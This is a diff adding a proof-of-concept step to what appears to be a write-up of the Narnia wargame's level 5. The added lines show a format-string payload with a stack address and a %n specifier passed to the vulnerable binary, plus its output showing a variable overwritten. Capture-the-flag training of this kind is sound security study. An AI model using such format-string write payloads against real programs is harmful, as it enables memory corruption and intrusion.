@@ -394,6 +394,10 @@ int main(int argc, char **argv){
 ```
 ### PoC:
 ```
+narnia5@narnia:/narnia$ ./narnia5 "$(python -c 'print "\xe0\xd6\xff\xff$ff%n"')"
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [$ff] (7)
+i = 7 (0xffffd6e0)
 ```
 ### Exploit:
 ```
